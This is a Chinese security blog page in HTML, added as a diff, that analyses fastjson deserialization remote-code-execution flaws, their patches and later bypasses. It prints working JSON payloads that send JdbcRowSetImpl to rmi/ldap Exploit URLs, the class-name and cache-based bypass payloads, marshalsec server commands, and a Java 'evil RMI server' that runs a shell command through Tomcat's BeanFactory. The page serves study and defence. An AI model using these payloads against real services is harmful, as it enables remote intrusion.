@@ -1,0 +1,1092 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="QwQ0QwQ">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="fastjson 1.2.24 反序列化导致任意命令执行漏洞Fastjson RCE关键函数DefaultJSONParser. parseObject() 解析传入的 json 字符串提取不同的 key 进行后续的处理 TypeUtils. loadClass() 根据传入的类名，生成类的实例 JavaBeanDeserializer. Deserialze() 依次调用 @type 中传入类的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QwQ0QwQ&#39;s blog">
+<meta property="og:url" content="http://example.com/2023/07/06/fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="QwQ0QwQ&#39;s blog">
+<meta property="og:description" content="fastjson 1.2.24 反序列化导致任意命令执行漏洞Fastjson RCE关键函数DefaultJSONParser. parseObject() 解析传入的 json 字符串提取不同的 key 进行后续的处理 TypeUtils. loadClass() 根据传入的类名，生成类的实例 JavaBeanDeserializer. Deserialze() 依次调用 @type 中传入类的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01a5ff8f8de735d351.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t015cd5093d1ee3a09b.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01549470c20b3f13f6.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0129cffe59ddb4ca02.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01d87c5c339e87266a.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t019c723b2e9d2dd9a5.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t011533f9b9d6417623.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01085a5b6ca5669e95.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01b82012d0e7ab7d26.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01ff09cbbfe74b70b2.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0137bc6df439407d56.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0197a9793be67543f6.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t019f5d6fb159fdfd30.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0107703cb32293aaf7.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01cd5cb6193f67c67a.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01dea2fd740cc515fe.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01badc70d5e064dd47.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01dd61f1b4877d4b43.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t01f08e253e7ca114bc.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01a65e0a6a8c9bf872.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t012608e2ea52b3dd17.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t011aa3809b12daa113.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01ed4a4e87b35deb83.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t010c3eff789e81b509.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t017e59d2c838a66464.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01be2cec57b0dd6279.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01c05ff78da55bf60f.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01f1e3bd2ae6032b79.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0172673d9beca65dd0.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01126b2b2b27e4d2c1.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t015289d9c5a3536680.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t019d07272675385707.png">
+<meta property="og:image" content="c:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204008933.png">
+<meta property="og:image" content="c:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204113554.png">
+<meta property="og:image" content="c:\Users\HSR\AppData\Roaming\Typora\typora-user-images\image-20230706204222252.png">
+<meta property="article:published_time" content="2023-07-06T13:26:52.209Z">
+<meta property="article:modified_time" content="2023-07-06T13:25:41.015Z">
+<meta property="article:author" content="QwQ0QwQ">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png">
+  
+  
+  
+  <title>QwQ0QwQ&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"SeYWUaxob5NvOeVcArETF3JO-gzGzoHsz","app_key":"5irVcutGGTJFLtJ9dXXA9SNn","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>QwQ0QwQ&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-06 21:26" pubdate>
+          2023年7月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          165 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><h3 id="Fastjson-RCE关键函数"><a href="#Fastjson-RCE关键函数" class="headerlink" title="Fastjson RCE关键函数"></a>Fastjson RCE关键函数</h3><p>DefaultJSONParser. parseObject() 解析传入的 json 字符串提取不同的 key 进行后续的处理</p>
+<p>TypeUtils. loadClass() 根据传入的类名，生成类的实例</p>
+<p>JavaBeanDeserializer. Deserialze() 依次调用 @type 中传入类的对象公有 set\get\is 方法。</p>
+<p>ParserConfig. checkAutoType() 阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。</p>
+<h3 id="fastjson-RCE漏洞的源头"><a href="#fastjson-RCE漏洞的源头" class="headerlink" title="fastjson RCE漏洞的源头"></a>fastjson RCE漏洞的源头</h3><p>首先来看一次fastjson反序列化漏洞的poc：</p>
+<p>{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit”,””autoCommit”:true}<br>先看调用栈。</p>
+<p>第一版的利用原理比较清晰，因为fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数，因此我们在寻找利用类的时候思路如下：</p>
+<p>1、类的成员变量我们可以控制；</p>
+<p>2、想办法在调用类的某个set\get\is函数的时候造成命令执行。</p>
+<p>于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，标准的jndi注入利用。</p>
+<p>Exec:620,Runtime &#x2F;&#x2F;命令执行</p>
+<p>Lookup:417,InitalContext &#x2F;jndi lookup函数通过rmi或者ldap获取恶意类</p>
+<p>setAutoCommit:4067,JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数</p>
+<p>setValue:96,FieldDeserializer &#x2F;&#x2F;反射调用传入类的set函数</p>
+<p>deserialze:600, JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数</p>
+<p>parseObject:368,DefaultJSONParser 解析传入的json字符串</p>
+<p>关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。</p>
+<p>注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。</p>
+<p>1、基于rmi的利用方式</p>
+<p>适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。</p>
+<p>利用方式：</p>
+<p>java -cpmarshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/test/#Exploit">http://127.0.0.1:8080/test/#Exploit</a></p>
+<p>2、基于ldap的利用方式</p>
+<p>适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</p>
+<p>利用方式：</p>
+<p>java -cpmarshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/test/#Exploitt">http://127.0.0.1:8080/test/#Exploitt</a></p>
+<p>3、基于BeanFactory的利用方式</p>
+<p>适用jdk版本：JDK 11.0.1、8u191、7u201、6u211以后。</p>
+<p>利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。</p>
+<p>利用方式：</p>
+<p>public class EvilRMIServerNew {</p>
+<pre><code class="hljs">public static void main(String[] args) throws Exception &#123;
+
+    System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);
+
+    Registry registry = LocateRegistry.createRegistry(1097);
+
+
+    //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
+
+    ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
+
+    //redefine a setter name for the &#39;x&#39; property from &#39;setX&#39; to &#39;eval&#39;, see BeanFactory.getObjectInstance code
+
+    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+
+    //expression language to execute &#39;nslookup jndi.s.artsploit.com&#39;, modify /bin/sh to cmd.exe if you target windows
+
+    ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;/bin/sh&#39;,&#39;-c&#39;,&#39;open /Applications/Calculator.app/&#39;]).start()\&quot;)&quot;));
+
+
+    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+
+    registry.bind(&quot;Object&quot;, referenceWrapper);
+
+
+&#125;
+</code></pre>
+<p>}<br>fastjson RCE漏洞的历次修复与绕过<br>fastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType() ，在接下来的一系列绕过中都是和这个函数的斗智斗勇。</p>
+<p>先看一下这个函数的代码：</p>
+<p>public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {</p>
+<pre><code class="hljs">if (typeName == null) &#123;
+
+    return null;
+
+&#125; else if (typeName.length() &gt;= 128) &#123;
+
+    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+
+&#125; else &#123;
+
+    String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);
+
+    Class&lt;?&gt; clazz = null;
+
+    int mask;
+
+    String accept;
+
+    if (this.autoTypeSupport || expectClass != null) &#123;
+
+        for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123;
+
+            accept = this.acceptList[mask];
+
+            if (className.startsWith(accept)) &#123;
+
+                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+
+                if (clazz != null) &#123;
+
+                    return clazz;
+
+                &#125;
+
+            &#125;
+
+        &#125;
+
+
+        for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123;
+
+            accept = this.denyList[mask];
+
+            if (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
+
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+
+            &#125;
+
+        &#125;
+
+    &#125;
+</code></pre>
+<p>防御的方式比较清晰，限制长度+黑名单，这个时候第一时间产生的想法自然是绕过黑名单，先看一下第一版的黑名单：</p>
+<p>this.denyList &#x3D; “bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework”.split(“,”);<br>其实第一版的黑名单还是挺强大的，关于黑名单的绕过，就我已知的目前只有一个依赖于ibatis的payload，当然因为ibatis在java里面的使用还是非常广泛的，所以这个payload危害也是比较大的，这也就是1.2.45的绕过。</p>
+<p>{“@type”:”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”,”properties”{“data_source”:”rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit”}}<br>绕过黑名单是第一种思路，但是安全界大牛们思路还是比较灵活的，很快又发现了第二种思路，我们再仔细看一下checkAutoType函数的下面这几行代码：</p>
+<p>f (!this.autoTypeSupport) {</p>
+<pre><code class="hljs">for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123;
+
+    accept = this.denyList[mask];
+
+    if (className.startsWith(accept)) &#123;
+
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+
+    &#125;
+
+&#125;
+
+
+for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123;
+
+    accept = this.acceptList[mask];
+
+    if (className.startsWith(accept)) &#123;
+
+        if (clazz == null) &#123;
+
+            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+
+        &#125;
+</code></pre>
+<p>该函数是先检查传入的@type的值是否是在黑名单里，然后再进入loadClass函数，这样的话如果loadClass函数里要是会对传入的class做一些处理的话，我们是不是就能绕过黑名单呢，跟进loadClass函数，</p>
+<p>public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {</p>
+<pre><code class="hljs">if (className != null &amp;&amp; className.length() != 0) &#123;
+
+    Class&lt;?&gt; clazz = (Class)mappings.get(className);
+    if (clazz != null) &#123;
+
+        return clazz;
+
+    &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;
+
+        Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+
+        return Array.newInstance(componentType, 0).getClass();
+
+    &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
+
+        String newClassName = className.substring(1, className.length() - 1);
+
+        return loadClass(newClassName, classLoader);
+</code></pre>
+<p>可以看到当传入的className以L开头以 ; 结尾的时候会把className的首字符和最后一个字符截去，再去生成实例，于是绕过的poc就非常好写了，原来的payload的利用类的首尾加上这两个字符就Ok了。</p>
+<p>{“@type”:”Lcom.sun.rowset.RowSetImpl;”,”dataSourceName”:”rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit”,”autoCommit”:true}<br>之后的42、43版本的绕过和41的原理是一样的我们就不再提了，具体可以去<a target="_blank" rel="noopener" href="https://github.com/shengqi158/fastjson-remote-code-execute-poc/%E8%87%AA%E8%A1%8C%E6%9F%A5%E9%98%85%E3%80%82">https://github.com/shengqi158/fastjson-remote-code-execute-poc/自行查阅。</a></p>
+<p>最新fastjson RCE的分析<br>OK，现在来到了我们期待已久的最新的fastjson漏洞的分析，关于这个漏洞有很精彩的小故事可以讲一讲。</p>
+<p>这个漏洞在曝光之后poc迟迟未见，关于它能够被利用成功的版本也可谓是每日都有更新，关于版本有几个关键字“51”、“48”，“58”，究竟是哪个让人摸不到头脑，于是乎，决定先去看看官方的公告，发现只有49版本releases的公告里面写了“增强安全防护”，于是乎决定去48、49版本寻觅一下，看看commit之类的，但是当时也没有发现什么。</p>
+<p>这个时候，一个名不愿透露姓名的大佬在某个技术群里面默默发了一个关键字“testcase“，当时忽然间产生了一丝电流，难道阿里的大佬们在修漏洞的时候会在testcase里面做测试，然后还把testcase的代码传到git里面了？但是还不够，因为testcase的代码太多了究竟放在哪里呢，这个时候之前的分析就可以知道，阿里在防护第一版RCE的时候是通过autotypecheck函数，那这次的补丁也很有可能和它相关喽，直接在testcase里面全局寻找带有autotype关键字的文件名，于是乎，就到达了如下位置：</p>
+<p>依次去看一下里面的文件，基本都是和反序列化漏洞相关的test，其中AutoTypeTest4.java文件中有如下代码：</p>
+<p>public void test_0()throws Exception{<br>    String payload&#x3D;”{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}”;<br>    String payload_2&#x3D;”{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:8889&#x2F;xxx&quot;,&quot;autoCommit&quot;:true}”;</p>
+<pre><code class="hljs">assertNotNull(&quot;class deser is not null&quot;,config.getDeserializer(Class.class));
+</code></pre>
+<p>int size&#x3D;mappings.size();</p>
+<p>final int COUNT&#x3D;10;<br>for(int i&#x3D;0;i&lt;COUNT; ++i){<br>        JSON.parse(payload,config);<br>    }</p>
+<p>for(int i&#x3D;0;i&lt;COUNT; ++i){<br>        Throwable error2&#x3D;null;<br>try{<br>            JSON.parseObject(payload_2);<br>        }catch(Exception e){<br>            error2&#x3D;e;<br>        }<br>        assertNotNull(error2);<br>        assertEquals(JSONException.class,error2.getClass());<br>    }<br>    assertEquals(size,mappings.size());<br>}<br>看上去和以往的payload都不太一样，先去写一个简化版的代码，调试一下：</p>
+<p>String payload&#x3D;”{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}”;</p>
+<p> String payload_2 &#x3D; “{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}”;</p>
+<p> JSON.parse(payload);</p>
+<p> JSON.parse(payload_2);<br>发现可以弹框成功（从49版本往前，一个版本一个版本试验，到47版本试验成功了），那这就很可疑了，但是还有个问题，漏洞要利用总不能让你同时传进去两个json字符串让你依次parse吧，于是把两串json整理如下<br>{“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit”,”autoCommit”:true}}}<br>果然可以利用成功，、接下来可以调试一下看看漏洞成因，因为一眼就能看出来是绕过了黑名单，所以问题的关键自然在checkAutoType()和loadClass()这两个函数中，去跟进一下</p>
+<p>首先在” a “ :{ “ @type “ : “ java.lang.Class “ , “ val “ : “ com.sun.rowset.JdbcRowSetImpl “ } 传入的时候，Class类是不在黑名单内的，在MiscCodec类的deserialze函数里面可以看到会将val的值拿出来用来生成对应的对象，即JdbcRowSetImpl，但是我们并没法给JdbcRowSetImpl对象的成员变量赋值，</p>
+<p>继续往deserialze的下面看，当传入的@type的值为Class的时候会调用loadClass函数，</p>
+<p>再往下跟，有调了一下loadClass函数，多加了一个值为true的参数</p>
+<p>再跟进去可以看到因为传入的cache为true，所以会在mapping里面把JdbcRowSetImpl这个对象的实例和com.sun.rowset.JdbcRowSetImpl 对应起来，OK现在关于a的分析到此为止，</p>
+<p>我们该去跟着b</p>
+<p>（” b “ :{ “ @type “ : “ com.sun.rowset.JdbcRowSetImpl “ , “ dataSourceName “ : “ ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit “ , “ autoCommit “ :true}} ）了，看看为什么checkautotype()函数没把b给拦下来，直接去跟进checkautotype函数，当autotype为true的时候，虽然发现黑名单匹配了，但是TypeUtils.getClassFromMapping(typeName) ！&#x3D;null所以不会抛出异常。</p>
+<p>而当autotype为false的时候，发现当传入的@type对应的类在mapping里面有的时候，就直接把之前生成的对象拉出来了，这时候直接返回，压根还没有走到后面的黑名单，所以成功绕过了之前的补丁。可以看到这次的poc是不受autotype影响的，</p>
+<p>从上面的分析也可以明白后续官方的补丁做了什么，那自然是把cache的默认值改成了false，不让Class生成的对象存在mapping里面了。</p>
+<p>Fastjson漏洞挖掘的规律总结<br>从上面追溯的fastjson的修复绕过上面可以看到有以下几点还是很值得注意的：</p>
+<p>1、 fastjson的防范类是checkAutoType函数，而导致命令执行的很关键的一步是loadClass，因此从checkAutoType到loadClass之间的代码，将会是绕过补丁需要研究的关键部分。</p>
+<p>2、 如果需要绕过黑名单，需要将目光放到使用量较大，并提供jndi功能的jar包上。</p>
+<p>3、 对于这种早就修复但是官方还没有公开的漏洞，github的源码中说不定有惊喜。</p>
+<h2 id="Java安全之FastJson-JdbcRowSetImpl-链分析"><a href="#Java安全之FastJson-JdbcRowSetImpl-链分析" class="headerlink" title="Java安全之FastJson JdbcRowSetImpl 链分析"></a>Java安全之FastJson JdbcRowSetImpl 链分析</h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>续上文的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14601670.html">Fastjson TemplatesImpl链分析</a>，接着来学习<code>JdbcRowSetImpl</code> 利用链，<code>JdbcRowSetImpl</code>的利用链在实际运用中较为广泛，这个链基本没啥限制条件，只需要<code>Json.parse(input)</code>即可进行命令执行。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><p>首先来说说限制，基于JNDI+RMI或JDNI+LADP进行攻击，会有一定的JDK版本限制。</p>
+<p>RMI利用的JDK版本≤ JDK 6u132、7u122、8u113</p>
+<p>LADP利用JDK版本≤ 6u211 、7u201、8u191</p>
+<p><img src="https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li>首先是这个lookup(URI)参数可控</li>
+<li>攻击者控制URI参数为指定为恶意的一个RMI服务</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；</li>
+</ol>
+<h3 id="JDNI注入细节"><a href="#JDNI注入细节" class="headerlink" title="JDNI注入细节"></a>JDNI注入细节</h3><p>简单分析一下lookup参数可控后，如何走到RCE.</p>
+<p>调用链：</p>
+<ul>
+<li>-&gt; RegistryContext.decodeObject()</li>
+<li>-&gt; NamingManager.getObjectInstance()</li>
+<li>-&gt; factory.getObjectInstance()</li>
+<li>-&gt; NamingManager.getObjectFactoryFromReference()</li>
+<li>-&gt; helper.loadClass(factoryName);</li>
+</ul>
+<p><img src="https://p5.ssl.qhimg.com/t01a5ff8f8de735d351.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>loadclass进行实例化，触发静态代码块的Runtime代码执行命令执行。</p>
